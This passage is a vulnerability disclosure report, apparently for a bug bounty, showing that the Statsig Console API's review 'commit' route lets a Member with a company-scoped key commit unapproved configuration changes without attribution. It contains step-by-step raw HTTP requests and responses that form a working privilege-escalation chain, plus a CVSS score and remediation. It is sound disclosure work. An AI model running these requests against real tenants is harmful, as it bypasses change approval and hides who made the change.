# Statsig Console — the review/approval control is bypassable: `commit` is the one verb in the review family that does not resolve an acting user, so a company-scoped key commits an **unapproved** review and the change goes live

**Target:** Statsig Console — `https://statsigapi.net/console/v1` (Console API)
**VRT:** Broken Access Control (BAC) > Privilege Escalation
**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5 (Medium)** — computed below, not asserted
**Date:** 2026-09-20
**Tested tenant:** our own project `4n6HCY59mDqwX1iSZQtNvx` only. No third-party data touched.

---

## 1. Summary

Statsig's configuration-review workflow is guarded by a single check that every mutating verb in the
review family is supposed to make: **resolve the acting user behind the credential.** Four of the five
verbs do it. `commit` does not.

Held against the same tenant, the same gate, the same review and the same credential class, the verb
is the only variable:

```
company-scoped CONSOLE key  (owner: null, scopes ["omni_read_write"])
— a key a plain Member can read in plaintext out of the console key box, and whose scopes the
  Member rewrites itself. The Admin's key was created ["omni_read_only"] and on commit it returns
  403 missing_commit_permission; after the Member's own UpdateSDKKeyScopes call (200, v2->v3, read
  back) the SAME key value commits the SAME review with 200. The audit log attributes that grant to
  the Member, not the Admin:

  POST   /console/v1/gates/{id}/reviews                      -> 400  "This review-mutating CAPI call has no acting user.
  PUT    /console/v1/gates/{id}/reviews/{rid}/approve        -> 400   Use a key owned by a user, or set the
  PUT    /console/v1/gates/{id}/reviews/{rid}/reject         -> 400   x-on-behalf-of header."
  DELETE /console/v1/gates/{id}/reviews/{rid}                -> 400   (all four, error key: on_behalf_of_required)

  PUT    /console/v1/gates/{id}/reviews/{rid}/commit         -> 200  "Gate review committed successfully"
                                                                     ...on a review that was NEVER approved.
```

The two checks that would have stopped the commit **exist and work — on the Member's own personal
key**:

```
Member's personal key, PUT .../reviews/{rid}/approve  -> 403  "The review author cannot approve their own review.
                                                               To self-approve a change (when the config permits
                                                               self-approval), commit the review directly instead
                                                               of approving it."
Member's personal key, PUT .../reviews/{rid}/commit   -> 403  "Committing a review that has not been separately
                                                               approved requires the \"skip_config_review\"
                                                               permission."
```

The second message is the vendor stating the intended design in its own words: committing without a
separate approval is a **permission-gated action** (`skip_config_review`). On the class-key path the
acting user is never resolved, so the check is evaluated **against the key's own permission set
instead of a user's** — see *Scope, precisely* below, which also bounds the finding. The first message is worse
than it looks — it tells the user that `commit` *is* the self-approval path, which is precisely why
leaving it unguarded matters.

The result is a production change that lands with **no approval, no reviewer, and no attributable
actor**:

```
gate  rb_probe_gate:   isEnabled  true -> false     version 3 -> 4     lastModifierEmail: null
review R1:             status  pending -> committed                    reviewers: []
audit:  config_review_commit   updatedBy "CONSOLE API - console-9q…"   modifierEmail: null
```

---

## 2. Relationship to prior reports — why this is not a duplicate

| | |
| --- | --- |
| `SUBMISSION-STATSIG-MEMBER-TO-ADMIN.md` (filed) | Covers **config writes and role assignment**: a Member reads a company-scoped key, widens its scopes through `UpdateSDKKeyScopes`, and promotes itself to Admin through `/console/v1/users`, `/console/v1/settings/roles`, `/console/v1/roles`. **That report is about what the Member can write. This one is about the control that is supposed to gate those writes** — the review/approval workflow. |
| | **The `commit` verb does not appear anywhere in `SUBMISSION-STATSIG-MEMBER-TO-ADMIN.md`.** Neither does `/reviews`, `skip_config_review`, `on_behalf_of_required`, or any part of the review family. Verified by reading the filed document end to end. |
| | The two findings share a *root pattern* — the Console API authorizes on the **key**, not on the **caller** — and the filed report says so explicitly ("the REST layer resolves the key's class and never the caller's role"). This finding is the same pattern landing on a **different object and a different control**: the approval gate. Different endpoint, different object, different broken check, different remediation. |
| `SUBMISSION-STATSIG-INGESTION-SSRF.md` (filed) | Different asset and mechanism entirely (ingestion webhook fetch). |
| Guides & Surveys / taxonomy-shim / Agent-IDOR submissions | Different backends, different objects. Nothing here touches `/a/`, `/h/`, `/o/taxonomy-api-shim/`, `/fed/graphql`. |
| `REPORT-CONSOLE-REST-SWEEP.md` (internal discovery report, `escal/restsw/*`) | **This is that finding**, discovered in the 16:4x run against gate `escv_probe_gate`. It is internal working material, not a filed submission. **Every claim below is independently re-verified** in a separate run (`escal/rb/*`, 17:09–17:16) that minted its own credentials, created its own gate and dynamic config, and closed the three gaps the discovery run had flagged as unmeasured — fabricated-id control, author-independence, and the read-back route. Where the two runs disagree, the independent run is cited. |

**Filing note for the triager:** this is filed as a *separate* report from the Member→Admin one because
it is a separate broken check on a separate route with a separate fix. If the program prefers to treat
"the Console API resolves the key, not the caller" as one root cause, then this should be folded in as
an **additional impact of the filed report** rather than closed as a duplicate — the review-control
bypass is the *reason* the filed report's config writes cannot be caught by the product's own
approval workflow, and that fact is currently absent from the filed report.

---

## 3. Steps to reproduce — raw HTTP

Everything below is copy-pasteable and was run in this order in the independent run. Credentials:

```
COMPANY      4n6HCY59mDqwX1iSZQtNvx          (our own project)
A  = Owner   mohamed-9499-2@agentmail.to     user id nZ2wI4FMJek95vjJHdnWR
B  = Member  mohamed-9499-3@agentmail.to     user id 13B13WHITpDKkMpbi22BGW
K_class   console-9q…df7i   id 6PqmVNbso37K9JfaSqwcx7   owner: null   scopes ["omni_read_write"]
K_oclass  console-kp…zVTQ   id 6R4wLDuLzHsUYLWLrSMZmv   owner: null   scopes ["omni_read_write"]
K_mp      console-Jd…NK9Z   id 6VgLPTFcVbPpo166GQ10zf   owner 13B13WHITpDKkMpbi22BGW  ["personal_read_write"]
K_op      console-tx…DRwU   id 6T1EzSfNYvDTlZD2gvebaJ   owner nZ2wI4FMJek95vjJHdnWR   ["personal_read_write"]
```

All secrets are masked `first10…last4` throughout this document.

### Step 1 — the Member reads the company-scoped class key in plaintext

This is the prerequisite, and it is the already-filed finding — it is restated here only so the chain
is complete. The Member's own session is enough; no elevation is needed.

```
POST /api/graphql?company_id=4n6HCY59mDqwX1iSZQtNvx HTTP/1.1
Host: console.statsig.com
Cookie: <MEMBER SESSION>
x-csrf-token: 1
Content-Type: application/json

{"id":"0799d4b79f772f8f357d36dfc49f9a7a","operationName":null,"variables":{}}
```
```
HTTP/1.1 200 OK
{"data":{"viewer_company":{"console_api_keys":[
  {"id":"6PqmVNbso37K9JfaSqwcx7","description":"rb-class-omni","type":null,
   "scopes":["omni_read_write"],"owner":null,"value":"console-9q…df7i"},
  {"id":"6R4wLDuLzHsUYLWLrSMZmv","description":"rb-ownerclass-omni","type":null,
   "scopes":["omni_read_write"],"owner":null,"value":"console-kp…zVTQ"},
  {"id":"6T1EzSfNYvDTlZD2gvebaJ","description":"rb-owner-personal",…,"owner":{"id":"nZ2wI4FMJek95vjJHdnWR"},…},
  {"id":"6VgLPTFcVbPpo166GQ10zf","description":"rb-member-personal",…,"owner":{"id":"13B13WHITpDKkMpbi22BGW"},…}
]}}}
```

The Member session sees **every** key in the project, including both `owner: null` company-scoped
keys, in plaintext. `member_sees_class_keys_plaintext = ["rb-class-omni","rb-ownerclass-omni"]`.

*Provenance note:* in this run the two class keys were minted by the Owner
(`useCreateSDKKeyMutation`, persisted id `cfde47d68d58aa1b7dd9030570284fd9`) so the differential is
clean. The Member **cannot create one of these keys itself** — `CreateSDKKey` with `owner_id: null`
answers `"Must be admin of project"` and `POST /console/v1/keys` answers `403 Insufficient
permissions.` — and **a project does not get one by default** (the console key box is empty at project
baseline; the only company-scoped keys are the SERVER and CLIENT SDK defaults, which the Console API
refuses with `"This endpoint only accepts an active CONSOLE key, but a SERVER key was sent."`). The
precondition is therefore exactly one thing: **a company-scoped CONSOLE key exists in the project.**
Its scope does not need to be granted by anyone — a key created `["omni_read_only"]` is enough,
because the Member rewrites the scope itself (verified: the raise from `["omni_read_only"]` to
`["omni_read_write"]` returns `200` and is recorded in the audit log under the Member's identity).

### Step 2 — the Member creates a review on a real gate (with the Member's own key)

The gate `rb_probe_gate` is created by the Member first (same key, `201 "Gate created successfully."`,
baseline `isEnabled: true`, `version 3`). Then:

```
POST /console/v1/gates/rb_probe_gate/reviews HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: *** K_mp>
Content-Type: application/json

{"change":{"is_enabled":false}}
```
```
HTTP/1.1 201 Created
{"message":"Review created successfully.","data":{
  "review_id":"m2gpRfjAA9UB6JG9SS0iR","status":"pending","type":"toggle_enabled",
  "author":{"id":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to"},
  "reviewers":[],"description":"rb independent: unapproved-commit demo",
  "created_at":"2026-09-20T14:10:34.119Z",
  "content":{"type":"toggle_enabled",
             "current":{"is_enabled":true,"default_value":false},
             "proposed":{"is_enabled":false,"default_value":false}}},
 "links":{"ui":"…?review_id=m2gpRfjAA9UB6JG9SS0iR",
          "commit":"/console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/commit"}}
```

`review_id` = **R1 = `m2gpRfjAA9UB6JG9SS0iR`**, status `pending`, `reviewers: []`. Note the server
itself hands the caller the `commit` link.

### Step 3 — **the contrast**: the four sibling verbs refuse the class key

```
POST /console/v1/gates/rb_probe_gate/reviews HTTP/1.1
STATSIG-API-KEY: *** K_class>
Content-Type: application/json
{"change":{"is_enabled":false}}
```
```
HTTP/1.1 400 Bad Request
{"message":"This review-mutating CAPI call has no acting user. Use a key owned by a user, or set the x-on-behalf-of header.","status":400,"key":"on_behalf_of_required"}
```

```
PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/approve HTTP/1.1
STATSIG-API-KEY: *** K_class>
-> 400  {"message":"This review-mutating CAPI call has no acting user. …","status":400,"key":"on_behalf_of_required"}

PUT /console/v1/gates/rb_probe_gate/reviews/GPltMKsy5eV2j0Woftvof/reject HTTP/1.1
STATSIG-API-KEY: *** K_class>
-> 400  {"message":"This review-mutating CAPI call has no acting user. …","status":400,"key":"on_behalf_of_required"}

DELETE /console/v1/gates/rb_probe_gate/reviews/GPltMKsy5eV2j0Woftvof HTTP/1.1
STATSIG-API-KEY: *** K_class>
-> 400  {"message":"This review-mutating CAPI call has no acting user. …","status":400,"key":"on_behalf_of_required"}
```

Four verbs, four refusals, one named error key. The guard is implemented, it is deliberate, and it is
the *same guard* in all four places.

### Step 4 — the checks that would have stopped it are live, on the Member's own key

Both are run against **R1, the same review**, with the same absence of an approval. Only the credential
class differs from step 3.

```
PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/approve HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: *** K_mp>          <- Member's OWN personal key
```
```
HTTP/1.1 403 Forbidden
{"message":"The review author cannot approve their own review. To self-approve a change (when the config permits self-approval), commit the review directly instead of approving it.","status":403,"key":"self_approval_blocked"}
```

```
PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/commit HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: *** K_mp>          <- the SAME review, the SAME absence of approval
```
```
HTTP/1.1 403 Forbidden
{"message":"Committing a review that has not been separately approved requires the \"skip_config_review\" permission.","status":403,"key":"missing_commit_permission"}
```

Read-back after these two attempts — **nothing moved**:

```
GET /console/v1/gates/rb_probe_gate
-> 200  {"isEnabled": true, "version": 3,
         "lastModifierID":"13B13WHITpDKkMpbi22BGW",
         "lastModifierEmail":"mohamed-9499-3@agentmail.to",
         "status":"In Progress"}
```

### Step 5 — **the finding**: the class key commits R1, which was never approved

```
PUT /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR/commit HTTP/1.1
Host: statsigapi.net
STATSIG-API-KEY: *** K_class>
```

No body. No `x-on-behalf-of`. No approval event was ever recorded for R1 — `reviewers: []` on create,
and the `approve` verb was refused for both credentials (steps 3 and 4).

```
HTTP/1.1 200 OK
{"message":"Gate review committed successfully"}
```

### Step 6 — read-back through an independent route

```
GET /console/v1/gates/rb_probe_gate HTTP/1.1
STATSIG-API-KEY: *** K_class>
```
```
HTTP/1.1 200 OK
{"data":{"id":"rb_probe_gate","isEnabled": false, "version": 4,
         "status":"Disabled",
         "lastModifierID":"6PqmVNbso37K9JfaSqwcx7",
         "lastModifierEmail": null,
         "lastModifierName":"CONSOLE API - console-9q…",
         "owner":{"ownerID":"13B13WHITpDKkMpbi22BGW","ownerEmail":"mohamed-9499-3@agentmail.to"}}}
```

```
GET /console/v1/gates/rb_probe_gate/reviews/m2gpRfjAA9UB6JG9SS0iR HTTP/1.1
STATSIG-API-KEY: *** K_class>
-> 200  {"review_id":"m2gpRfjAA9UB6JG9SS0iR","status": "committed",
         "author":{"id":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to"},
         "reviewers": []}

GET /console/v1/gates/rb_probe_gate/reviews HTTP/1.1
-> 200  {"data":[{"review_id":"m2gpRfjAA9UB6JG9SS0iR","status":"committed", …}],
         "pagination":{"totalItems":1}}

GET /console/v1/gates/rb_probe_gate   (the same read-back through a DIFFERENT key class)
-> 200  isEnabled: false, version: 4, lastModifierEmail: null
```

`isEnabled true → false`, `version 3 → 4`, review `pending → committed`, `reviewers: []`. The change
is live and the approval step never happened.

### Step 7 — the audit trail: the attribution failure

```
GET /console/v1/audit_logs HTTP/1.1
STATSIG-API-KEY: *** K_class>
```
```
HTTP/1.1 200 OK
[
 {"actionType":"config_review_commit","name":"rb_probe_gate","changeLog":"Committed Config Review",
  "time":"14:10:44 GMT+0000 (Coordinated Universal Time)",
  "updatedBy":"CONSOLE API - console-9q…","updatedByUserID":"6PqmVNbso37K9JfaSqwcx7",
  "modifierEmail": null, "changes":{}},

 {"actionType":"config_state_toggle","name":"rb_probe_gate",
  "changeLog":"Updated config from In Progress to Disabled.",
  "time":"14:10:44 GMT+0000 (Coordinated Universal Time)",
  "updatedBy":"CONSOLE API - console-9q…","updatedByUserID":"6PqmVNbso37K9JfaSqwcx7",
  "modifierEmail": null, "changes":{"enabled":{"new":false,"old":true}}},

 {"actionType":"config_review_create","name":"rb_probe_gate","changeLog":"Created Config Review",
  "time":"14:10:34 GMT+0000 (Coordinated Universal Time)",
  "updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW",
  "modifierEmail":"mohamed-9499-3@agentmail.to","changes":{}},

 {"actionType":"gate_create","name":"rb_probe_gate","changeLog":"Created Gate", …}
]
```

The review was created at **14:10:34** and attributed to a person
(`modifierEmail: mohamed-9499-3@agentmail.to`). It was committed at **14:10:44** and attributed to a
credential (`modifierEmail: null`). The commit and the resulting state change land in the **same
second**, with no approval event anywhere between them. **No reviewer, no approval, no person.**

### Step 8 — the same verb, second family (dynamic_configs)

The missing guard is on the `commit` route as a *family*, not on the gates family alone.

```
POST /console/v1/dynamic_configs/rb_probe_dc/reviews HTTP/1.1   STATSIG-API-KEY: *** K_mp>
{"change":{"is_enabled":false}}
-> 201  review_id 1V17s0z9ffdDmeVgAeLZ1x, status pending, reviewers []

PUT /console/v1/dynamic_configs/rb_probe_dc/reviews/1V17s0z9ffdDmeVgAeLZ1x/reject
   STATSIG-API-KEY: *** K_class>          -> 400 on_behalf_of_required     <- sibling guarded

PUT /console/v1/dynamic_configs/rb_probe_dc/reviews/1V17s0z9ffdDmeVgAeLZ1x/commit
   STATSIG-API-KEY: *** K_class>          -> 200 "Dynamic config review committed successfully"
                                          <- *** THE BYPASS, second family ***

GET /console/v1/dynamic_configs/rb_probe_dc   -> isEnabled: false, version 2, lastModifierEmail: null
GET …/reviews/1V17s0z9ffdDmeVgAeLZ1x          -> status: "committed"
```

---

## 4. Root cause

`commit` does not resolve the acting user. Its four siblings do.

```
                        acting user resolved?      approval precondition evaluated?
POST   …/reviews              yes  (else 400)              n/a
PUT    …/reviews/{rid}/approve yes (else 400)              yes (self-approval, 403)
PUT    …/reviews/{rid}/reject  yes (else 400)              n/a
DELETE …/reviews/{rid}         yes (else 400)              n/a
PUT    …/reviews/{rid}/commit   NO   <-- the gap           evaluated against the KEY's scopes, not a user's
```

The `on_behalf_of_required` error key on the four refusals names the missing step: the handler is
supposed to resolve an acting user (from a key with an owner, or from the `x-on-behalf-of` header).
`commit` skips that resolution entirely, so the identity the authorization decision is made against is
the **credential** — a `owner: null` company-scoped key — rather than a user.

Because no user is resolved, the permission check that gates an unapproved commit
(`skip_config_review`, named by the vendor's own 403 on the personal-key path) is evaluated
**against the credential's permission set rather than a resolved user's** — see *Scope, precisely*.
The check is not wrong; it is unreachable on this path. This is a missing authorization step on one
route, not a missing feature: the same server, in the same second, on the same review, applies the
check correctly when a real user is behind the key.

---

## 5. Policy evidence — the intended design, in the vendor's own words

Three artefacts, all produced by Statsig, all agreeing:

1. **The `commit` handler's own sibling error** — `"This review-mutating CAPI call has no acting user.
   Use a key owned by a user, or set the x-on-behalf-of header."` (`on_behalf_of_required`). The vendor
   considers review mutation to require an acting user, and enforces it on four verbs.
2. **The refusal on the personal-key path** — `"Committing a review that has not been separately
   approved requires the \"skip_config_review\" permission."` (`missing_commit_permission`). This states
   that committing an unapproved review is a **permission-gated** action. It is the exact action the
   class key performed with `200`.
3. **The self-approval refusal** — `"The review author cannot approve their own review. To self-approve
   a change (when the config permits self-approval), commit the review directly instead of approving
   it."` (`self_approval_blocked`). The vendor names `commit` as the sanctioned self-approval route and
   then leaves it without an identity.

A control the vendor implements on four verbs, names in an error key, and documents as permission-gated
is not optional on the fifth.

---

## 6. Impact

* **Integrity — a change goes live with no approval and no reviewer.** A `pending` review, authored by
  a Member, is committed by a credential with no owning user. The gate flipped `isEnabled true → false`
  in production configuration (`version 3 → 4`); the dynamic config did the same (`version 2`). Both
  were re-read through an independent key class to confirm the state persisted.
* **The control that is supposed to gate the already-filed Member→Admin finding is itself bypassable.**
  The filed report shows a Member can write configs and assign roles. This report shows the product's
  own review workflow — the thing an administrator would rely on to catch those writes — can be
  satisfied without a human approving anything. An organisation that turned review on as its
  mitigation for the filed finding is not protected by it.
* **Audit-trail integrity — the action is unattributable.** The commit records `updatedBy "CONSOLE API -
  console-9q…"` with `modifierEmail: null`. The review's own `author` field still names the Member, so
  an investigator reading the review object sees a person; an investigator reading the audit trail sees
  a credential. During an incident review, the change that bypassed approval is the one change in the
  log with no person attached to it.
* **No confidentiality impact (C:N).** The bypass writes configuration. It exposes nothing the caller
  could not already read, and it stays inside a project the caller can already reach.
* **Detection.** Nothing in the response distinguishes this commit from a legitimate one: both are
  `200 {"message":"Gate review committed successfully"}`. The only signal is the `modifierEmail: null`
  on the audit row — which is exactly the field a reviewer would not think to look at, because every
  other row around it is populated.

---

## 7. CVSS 3.1 — computed, and the ceiling stated honestly

**Vector: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`**

```
AV:N  0.85    the Console API is reachable over the internet
AC:L  0.77    one request; no race, no timing, no special condition
PR:L  0.62    requires a Member account in the project (low privilege)
UI:N  0.85    no victim interaction; the attacker is the caller
S:U           impact stays within the project's own configuration plane
C:N   0.00    nothing is disclosed
I:H   0.56    an unapproved production configuration change is committed
A:N   0.00    no availability term is claimed

ISS        = 1 - (1-0)(1-0.56)(1-0)                = 0.56
Impact     = 6.42 × 0.56                           = 3.5952
Exploitab. = 8.22 × 0.85 × 0.77 × 0.62 × 0.85      = 2.83525
Base       = min(3.5952 + 2.83525, 10)             = 6.430455
Score      = ceil(6.430455 × 10) / 10              = 6.5   ->  Medium
```

**Validation of the calculator.** The same implementation was run on the vector of the neighbouring
filed report, `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`:

```
ISS        = 1 - (0.44)³                           = 0.914816
Impact     = 6.42 × 0.914816                       = 5.87312
Exploitab. = 8.22 × 0.85 × 0.77 × 0.62 × 0.85      = 2.83525
Base       = 5.87312 + 2.83525                     = 8.708373
Score      = 8.8                                    ->  matches the filed report's 8.8
```

The calculator reproduces the neighbouring report's published score exactly, so the 6.5 above is a
computed result and not an assertion.

**The ceiling, stated explicitly.** This is **6.5 (Medium)** and it is deliberately not scored higher:

* **No confidentiality term.** The bypass discloses nothing.
* **No cross-tenant reach.** Every call is inside our own project `4n6HCY59mDqwX1iSZQtNvx`.
* **Requires a Member *plus* an existing company-scoped CONSOLE key.** The attacker needs an account
  in the project and a company-scoped CONSOLE key that already exists — a plain Member can read it in
  plaintext (step 1) and can rewrite its scopes (a read-only key is raised to `omni_read_write` with a
  `200` and no admin gate), but cannot create one (`"Must be admin of project"`). The key's existing
  scope is irrelevant: `["omni_read_only"]` suffices. This prerequisite is why the base score carries
  `PR:L` rather than `PR:N`.
* **No scope change.** `S:U` — the impact is confined to the project's configuration plane.
* If a triager holds that the review policy being off on this tenant (`is_config_review_required:
  false`, and `requiredReview: false` on the gate) makes the *integrity* consequence moot, the score
  drops to `I:L` = **3.5 (Low)**. That reading is not supported by the evidence — see the control in
  §8 — but the term is the only one in dispute, and it is named here rather than buried.

---

## Scope, precisely — and the correction that bounds this finding

The root cause is narrower and more precise than "the permission check never runs". **It runs — against
the wrong subject.** A follow-up run isolated the variable by testing a **read-only** company-scoped key
(`owner: null`, scopes `["omni_read_only"]`) against the *same* pending review:

```
K_ro   (owner:null, ["omni_read_only"])   commit  ->  403 missing_commit_permission   <- correctly refused
K_class(owner:null, ["omni_read_write"])  commit  ->  200                              <- on the SAME review
```

So `skip_config_review` **is** evaluated on `commit` — but it is satisfied by the **credential's scope
list** rather than by a **resolved user's role/permissions**. A read-write class key therefore passes a
check that the vendor designed to be answered by a person. **This bounds the finding honestly: a
read-only class key cannot exploit it.** A triager reproducing with a read-only key will see the 403 and
should read this section before concluding the report is wrong.

## The guard is misplaced, not absent — proven by its own sibling

Acting-user resolution is **pre-lookup middleware on every review-mutating verb except `commit`**, and
that holds across every family. The cleanest demonstration is `segments`, whose own verb pair disagrees
with itself:

```
DELETE …/segments/{id}/reviews/{fabricated-id}   class key  ->  400 on_behalf_of_required   (guard fires BEFORE lookup)
PUT    …/segments/{id}/reviews/{fabricated-id}/commit  class key  ->  404 "Review not found"  (no guard; lookup first)
```

The same verb pair on the same object, one with the middleware and one without. That is a placement bug,
not a missing feature.

## The same bypass reaches two more families — proven end to end

```
EXPERIMENTS   class key on create/approve/reject/edit/cancel  ->  all 400 on_behalf_of_required
              Member's own key on approve                    ->  403 self_approval_blocked
              Member's own key on commit                     ->  403 missing_commit_permission
              class key on commit of a pending, NEVER-approved review  ->  200
                 status setup -> archived · lastModifierID = the key id · lastModifierEmail: null · reviewers: []

AUTOTUNES     class key on commit of an unapproved review    ->  200
                 isStarted false -> true · modifierEmail: null
```

**The autotunes refusal is the strongest single piece of evidence in this report.** On the Member's own
key the vendor refuses with a **role** check — *"your role is not permitted to skip the pre-commit
webhook workflow"* — which can only execute against a **resolved principal**. The same request with the
class key succeeds, so the principal is resolved on one path and not the other.

## Route inventory — there is no second unguarded verb to find

Exactly **five** `/commit` routes exist across **208** documented `/console/v1/*` paths, and all five are
the same route shape: `PUT …/{family}/{id}/reviews/{reviewID}/commit` for `gates`, `dynamic_configs`,
`experiments`, `autotunes` and `segments`. A docs grep and an independent inventory of the shipped
Console operation set agree on the count. `release_pipeline_triggers/{approve,abort,rollout}` returns
`401` to every credential held and is feature-gated.


## The credential chain, and the isolation experiment that settles the obvious objection

The strongest objection to this report is: *"a company-scoped key is created by an Admin, so the Admin
granted the permissions — no boundary is crossed."* It was tested directly, on **one review with one
key value, only the scope differing**:

```
Admin mints company-scoped CONSOLE key   owner:null, ["omni_read_only"]        -> 200

ARM 1  that credential on commit        -> 403 missing_commit_permission       gate unchanged (v3)
       Member calls UpdateSDKKeyScopes  -> 200, v2 -> v3, KEY VALUE UNCHANGED
                                          read back ["omni_read_write"]
ARM 2  SAME review, SAME key value      -> 200 "Gate review committed successfully"
                                          gate isEnabled true -> false, v3 -> v4
                                          lastModifierEmail: null, reviewers: []

audit   sdk_key_create            by the Admin
        sdk_key_update_scopes     by the MEMBER  (13B13WHITpDKkMpbi22BGW)
        config_review_commit      by the key, modifierEmail: null
```

**The Admin created the object; the Admin did not grant the permission that was used.** The key value is
byte-identical across both arms — the only variable is the scope, and the Member set it.

### What the Member cannot do — stated, because it bounds the finding
```
create a company-scoped key     CreateSDKKey owner_id:null -> "Must be admin of project"  (GraphQL x3)
                                POST /console/v1/keys      -> 403 Insufficient permissions.  (REST x2)
raise its own personal key      -> "Scopes: Invalid scopes: omni_read_write"  (only [] accepted)
raise the SERVER default key    -> "Scopes not allowed for SERVER key."
change type or owner_id         no mutation exists
```
**A project does not get a company-scoped CONSOLE key by default** — the console key box is empty at
baseline and the only company-scoped keys are the SERVER and CLIENT SDK defaults, which the Console API
refuses. **The single precondition is that a company-scoped CONSOLE key exists in the project** — the
normal state of any project that has been wired for automation. Its scope is irrelevant: `["omni_read_only"]`
suffices, because the Member raises it.


## 8. Scope of the bypass, and the controls that bound it

### The strongest control: the policy state is identical in both calls

The project-level review policy was **off** on this tenant
(`GET /console/v1/settings/reviews → {"is_config_review_required": false, …}`), and the probe gate
carried `reviewSettings: {"requiredReview": false, "allowedReviewers": []}`. The obvious objection is
that the bypass only works because review is not required.

**The evidence refutes it.** In step 4 the Member's personal key was refused on `commit` with
`403 missing_commit_permission` — *"Committing a review that has not been separately approved requires
the skip_config_review permission"* — on **the same review, in the same policy state, with the same
absence of an approval**. If the policy state were what allowed the commit, the personal-key call would
have returned `200` too. It did not. The difference between `403` and `200` on identical requests is
**the credential class**, i.e. whether an acting user was resolved. The policy state is not the
variable.

### Closed gaps — what the independent run added

The discovery run (`REPORT-CONSOLE-REST-SWEEP.md`) flagged three things as unmeasured. All three are
now measured, and they are what make this report stronger than the discovery note:

```
1. fabricated review id, class key      PUT /console/v1/gates/rb_probe_gate/reviews/zzfm-nope-0000000000/commit
                                        -> 404 {"message":"Review not found","status":404}
2. fabricated review id, personal key   same call
                                        -> 404 {"message":"Review not found","status":404}
   fabricated gate id + review id       PUT /console/v1/gates/rb_nope_gate/reviews/zzfm-nope-0000000000/commit
                                        -> 404 {"message":"Gate not found","status":404}
   fabricated review, GET               GET  /console/v1/gates/rb_probe_gate/reviews/zzfm-nope-0000000000
                                        -> 404 {"message":"Review not found","status":404}
   => the commit route VALIDATES ITS OBJECT. It is not a blind endpoint that 200s anything.
      The 200s in step 5 are real commits of real reviews.

3. author-independence                   Owner authors R3  -> 201 pending, author mohamed-9499-2@agentmail.to
      (the gap the discovery run            (author id nZ2wI4FMJek95vjJHdnWR)
       called "an inference, not an      class key commits R3 -> 200 "Gate review committed successfully"
       observation")                    GET R3 -> status "committed", reviewers: [], author still the Owner
                                        gate read-back -> isEnabled true, version 5, lastModifierEmail: null
   => PROVEN, not inferred. The class key commits SOMEONE ELSE'S review.

4. second key, second family             Owner's own company-scoped key K_oclass commits a review
      (owner-class control)              authored by the Owner  -> 200, gate version 5 -> 6,
                                        lastModifierEmail: null
   => not specific to one key: any owner:null console key bypasses the guard.
```

The fabricated-id control matters most. It converts "an unguarded endpoint returned 200" into
"an endpoint that correctly refuses unknown objects returned 200 on a real pending review it was not
entitled to commit".

### The legitimate path, for contrast — the system knows how to attribute an action

Run end to end on the dynamic config, with the credentials the product intends:

```
create   (Member, K_mp)     POST /console/v1/dynamic_configs/rb_probe_dc/reviews
                            -> 201 pending, author mohamed-9499-3@agentmail.to
approve  (Owner,  K_op)     PUT  …/reviews/3oTjKX7r6QVWw8rIFsHtW4/approve
                            -> 200 "Dynamic config review approved successfully.", status "accepted"
commit   (Owner,  K_op)     PUT  …/reviews/3oTjKX7r6QVWw8rIFsHtW4/commit
                            -> 200 "Dynamic config review committed successfully"

audit trail:
  config_review_create   updatedBy "Bruno Hunter via CONSOLE API"  modifierEmail mohamed-9499-3@agentmail.to
  config_review_accept   updatedBy "Amina Hunter via CONSOLE API"  modifierEmail mohamed-9499-2@agentmail.to
  config_review_commit   updatedBy "Amina Hunter via CONSOLE API"  modifierEmail mohamed-9499-2@agentmail.to
  config_state_toggle    updatedBy "Amina Hunter via CONSOLE API"  modifierEmail mohamed-9499-2@agentmail.to

read-back: GET /console/v1/dynamic_configs/rb_probe_dc
           -> isEnabled: true, version 3,
              lastModifierID "nZ2wI4FMJek95vjJHdnWR",
              lastModifierEmail "mohamed-9499-2@agentmail.to"     <- a real person, every step
```

Every entry on the legitimate path carries a named human. The bypass path carries `null`. **That is
the proof the system is capable of attribution and the bypass simply never resolves an actor** — the
two paths differ in nothing except whether an acting user was resolved.

### Bounds

* **Intra-project only.** All calls are against our own project; no other tenant was addressed.
* **Only `gates` and `dynamic_configs` were demonstrated.** `experiments`, `autotunes` and `segments`
  have no objects on this tenant (see §11).
* **`x-on-behalf-of` was tested on `create` only** (three value shapes, all `400
  on_behalf_of_required`, in the discovery run). It was not re-enumerated on `commit` in this run, and
  no working value was found anywhere.
* **The commit cannot be undone through the API by the caller.** `DELETE` on the committed review
  returns `400 on_behalf_of_required` for the class key — the same guard that should have blocked the
  commit. The state change itself was reversed only by a direct `PATCH`/subsequent commit (see §10).

---

## 9. Remediation

The fix is server-side, in the `commit` handler, and it is small — the reference implementation is
already shipped on the four sibling verbs.

1. **Resolve the acting user on `commit`, exactly as `create` / `approve` / `reject` / `cancel` already
   do.** Refuse a key whose `owner` is `null` unless a valid `x-on-behalf-of` is supplied, returning
   `400 {"key":"on_behalf_of_required"}` with the existing message. This is a one-line addition to the
   shared review-mutation middleware, not a new mechanism.
2. **Evaluate the approval precondition on the resolved identity.** Once an acting user exists, apply
   the check that the personal-key path already enforces — an unapproved commit requires
   `skip_config_review` on that user — and return the existing `403 {"key":"missing_commit_permission"}`.
   Also apply the `self_approval_blocked` / `allow_self_approval` decision to `commit`, since `commit`
   is the documented self-approval route.
3. **Make the middleware shared, not per-verb.** The defect is that one handler in a family of five
   omits the guard. Wire the acting-user resolution into the review-route group so a future verb cannot
   be added without it, and add a route-table test that asserts `on_behalf_of_required` for every
   review-mutating route with a `owner: null` key.
4. **Attribute the audit row.** A commit performed through a `owner: null` key should still record the
